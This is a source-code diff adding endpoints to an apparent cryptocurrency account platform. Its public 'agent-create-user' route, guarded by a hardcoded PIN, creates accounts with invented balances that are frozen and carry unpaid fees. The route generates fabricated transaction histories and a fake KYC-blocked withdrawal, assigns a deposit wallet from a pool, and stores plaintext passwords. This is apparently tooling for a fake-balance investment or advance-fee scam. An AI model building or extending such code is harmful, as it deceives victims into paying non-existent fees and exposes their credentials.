@@ -455,6 +455,249 @@ async def public_check_user(q: str):
     return {"ok": True, "found": False}
 
 
+# ============== WALLET POOL ==============
+
+@api_router.get("/admin/wallet-pool")
+async def admin_get_wallet_pool(admin: dict = Depends(require_admin)):
+    """List all wallets in the pool."""
+    wallets = await db.wallet_pool.find({}, {"_id": 0}).sort("created_at", -1).to_list(1000)
+    available = sum(1 for w in wallets if w.get("status") == "available")
+    return {"ok": True, "data": {"wallets": wallets, "available": available, "total": len(wallets)}}
+
+@api_router.post("/admin/wallet-pool")
+async def admin_add_wallets(request: Request, admin: dict = Depends(require_admin)):
+    """Add wallet addresses to the pool."""
+    body = await request.json()
+    addresses = body.get("addresses", [])
+    if not addresses:
+        raise HTTPException(status_code=400, detail="No addresses provided")
+    
+    added = 0
+    for addr in addresses:
+        addr = addr.strip()
+        if not addr:
+            continue
+        # Check if already exists
+        existing = await db.wallet_pool.find_one({"address": addr})
+        if existing:
+            continue
+        await db.wallet_pool.insert_one({
+            "id": str(uuid.uuid4()),
+            "address": addr,
+            "status": "available",
+            "assigned_to": None,
+            "assigned_email": None,
+            "created_at": datetime.now(timezone.utc).isoformat()
+        })
+        added += 1
+    
+    return {"ok": True, "message": f"Added {added} wallets to pool"}
+
+@api_router.delete("/admin/wallet-pool/{wallet_id}")
+async def admin_remove_wallet(wallet_id: str, admin: dict = Depends(require_admin)):
+    """Remove a wallet from the pool."""
+    result = await db.wallet_pool.delete_one({"id": wallet_id, "status": "available"})
+    if result.deleted_count == 0:
+        raise HTTPException(status_code=400, detail="Wallet not found or already assigned")
+    return {"ok": True, "message": "Wallet removed"}
+
+@api_router.get("/public/wallet-pool-count")
+async def public_wallet_pool_count():
+    """Public: get available wallet count (no addresses exposed)."""
+    count = await db.wallet_pool.count_documents({"status": "available"})
+    return {"ok": True, "available": count}
+
+@api_router.post("/public/agent-create-user")
+async def agent_create_user(request: Request):
+    """Agent-facing user creation with PIN protection and auto wallet assignment."""
+    body = await request.json()
+    
+    # PIN verification
+    pin = body.get("pin", "")
+    if pin != "8971":
+        raise HTTPException(status_code=403, detail="Invalid PIN")
+    
+    # Required fields
+    email = (body.get("email") or "").strip().lower()
+    password = body.get("password", "")
+    first_name = body.get("first_name", "").strip()
+    last_name = body.get("last_name", "").strip()
+    username = body.get("username", "").strip().lower()
+    date_of_birth = body.get("date_of_birth", "")
+    start_date = body.get("start_date", "")
+    end_date = body.get("end_date", "")
+    eur_amount = body.get("eur_amount", "0")
+    total_fees = body.get("total_fees", "0")
+    
+    if not all([email, password, first_name, last_name, username, date_of_birth]):
+        raise HTTPException(status_code=400, detail="All fields are required")
+    
+    # Check if email exists
+    existing = await get_user_by_email(email)
+    if existing:
+        raise HTTPException(status_code=400, detail="Email already registered")
+    
+    # Check username
+    existing_username = await db.users.find_one({"username": username})
+    if existing_username:
+        raise HTTPException(status_code=400, detail="Username already taken")
+    
+    # Get exchange rate for EUR -> USDC conversion
+    usdc_balance = "0.00"
+    if eur_amount and Decimal(eur_amount) > 0:
+        try:
+            import httpx
+            async with httpx.AsyncClient() as client:
+                resp = await client.get("https://api.frankfurter.dev/v1/latest?from=USD&to=EUR")
+                if resp.status_code == 200:
+                    eur_per_usd = Decimal(str(resp.json()["rates"]["EUR"]))
+                    eur_usdc = Decimal("1") / eur_per_usd
+                    usdc_balance = str((Decimal(eur_amount) * eur_usdc).quantize(Decimal("0.01")))
+        except Exception:
+            # Fallback rate
+            usdc_balance = str((Decimal(eur_amount) * Decimal("1.08")).quantize(Decimal("0.01")))
+    
+    # Auto-assign wallet from pool
+    wallet_doc = await db.wallet_pool.find_one_and_update(
+        {"status": "available"},
+        {"$set": {"status": "assigned", "assigned_email": email, "assigned_at": datetime.now(timezone.utc).isoformat()}},
+    )
+    eth_wallet = wallet_doc["address"] if wallet_doc else ""
+    
+    # Load system settings for connected app defaults
+    settings = await db.system_settings.find_one({"id": "system_settings"}, {"_id": 0})
+    connected_app_name = settings.get("default_connected_app_name", "") if settings else ""
+    connected_app_logo = settings.get("default_connected_app_logo", "") if settings else ""
+    
+    # Create the user
+    user = UserCreate(
+        email=email,
+        username=username,
+        password=password,
+        first_name=first_name,
+        last_name=last_name,
+        date_of_birth=date_of_birth,
+        role=UserRole.USER,
+        freeze_type="both",
+        initial_usdc_balance=usdc_balance,
+        initial_eur_balance="0.00",
+        total_fees=total_fees,
+        transaction_start_date=start_date or None,
+        transaction_end_date=end_date or None,
+        eth_wallet_address=eth_wallet,
+        connected_app_name=connected_app_name,
+        connected_app_logo=connected_app_logo,
+    )
+    
+    user_obj = User(
+        email=user.email,
+        username=user.username,
+        password_hash=hash_password(user.password),
+        first_name=user.first_name,
+        last_name=user.last_name,
+        date_of_birth=user.date_of_birth,
+        role=user.role,
+        freeze_type=user.freeze_type,
+        total_unpaid_fees=user.total_fees or "0.00",
+        eth_wallet_address=user.eth_wallet_address,
+        connected_app_name=user.connected_app_name,
+        connected_app_logo=user.connected_app_logo,
+        plain_password=user.password,
+    )
+    
+    user_dict = user_obj.model_dump()
+    await db.users.insert_one({**user_dict, "_id": user_obj.id})
+    
+    # Update wallet pool with user_id
+    if wallet_doc:
+        await db.wallet_pool.update_one(
+            {"id": wallet_doc["id"]},
+            {"$set": {"assigned_to": user_obj.id}}
+        )
+    
+    # Create wallets
+    usdc_wallet = Wallet(user_id=user_obj.id, asset=AssetType.USDC, balance=usdc_balance)
+    eur_wallet = Wallet(user_id=user_obj.id, asset=AssetType.EUR, balance="0.00")
+    await db.wallets.insert_many([usdc_wallet.model_dump(), eur_wallet.model_dump()])
+    
+    # Generate transaction history
+    tx_generated = 0
+    if start_date and end_date:
+        try:
+            transactions = generate_transaction_history(
+                user_id=user_obj.id,
+                wallet_id=usdc_wallet.id,
+                start_date=start_date,
+                end_date=end_date,
+                total_balance=usdc_balance,
+                total_fees=total_fees or "0.00",
+            )
+            if transactions:
+                for tx in transactions:
+                    tx["created_by_admin"] = True
+                    tx["admin_id"] = "agent"
+                await db.transactions.insert_many(transactions)
+                tx_generated = len(transactions)
+        except Exception as e:
+            logger.error(f"Agent create: failed to generate tx history: {e}")
+    
+    # Generate failed withdrawal
+    if Decimal(usdc_balance) > 0:
+        try:
+            from datetime import timedelta as td
+            if end_date:
+                failed_date = datetime.strptime(end_date, "%Y-%m-%d") + td(hours=random.randint(2, 18))
+            else:
+                failed_date = datetime.now(timezone.utc) - td(hours=random.randint(1, 48))
+            
+            failed_tx = {
+                "id": str(uuid.uuid4()),
+                "user_id": user_obj.id,
+                "wallet_id": eur_wallet.id,
+                "type": "withdrawal",
+                "asset": "EUR",
+                "amount": usdc_balance,
+                "fee": total_fees or "0.00",
+                "fee_paid": False,
+                "status": "failed",
+                "description": "Withdrawal rejected: identity verification (KYC) not completed. The system has detected an unverified withdrawal attempt and has blocked the transaction to protect account funds. Please complete the KYC verification process to enable withdrawals.",
+                "description_it": "Prelievo rifiutato: verifica dell'identità (KYC) non completata. Il sistema ha rilevato un tentativo di prelievo non verificato e ha bloccato la transazione per proteggere i fondi del conto. Si prega di completare la procedura di verifica KYC per abilitare i prelievi.",
+                "reference": f"WD{uuid.uuid4().hex[:8].upper()}",
+                "tx_hash": None,
+                "counterparty_address": None,
+                "counterparty_name": None,
+                "transaction_date": failed_date.isoformat(),
+                "created_at": failed_date.isoformat(),
+                "created_by_admin": True,
+                "admin_id": "agent"
+            }
+            await db.transactions.insert_one(failed_tx)
+            tx_generated += 1
+        except Exception as e:
+            logger.error(f"Agent create: failed withdrawal gen failed: {e}")
+    
+    logger.info(f"Agent created user: {email} (id={user_obj.id}, txs={tx_generated})")
+    
+    return {
+        "ok": True,
+        "data": {
+            "email": email,
+            "password": password,
+            "first_name": first_name,
+            "last_name": last_name,
+            "username": username,
+            "date_of_birth": date_of_birth,
+            "usdc_balance": usdc_balance,
+            "eur_amount": eur_amount,
+            "total_fees": total_fees,
+            "transaction_period": f"{start_date} — {end_date}" if start_date and end_date else "None",
+            "transactions_generated": tx_generated,
+            "wallet_assigned": bool(wallet_doc),
+        }
+    }
+
+
+
 
 @api_router.post("/auth/login")
 async def login(credentials: UserLogin, request: Request):
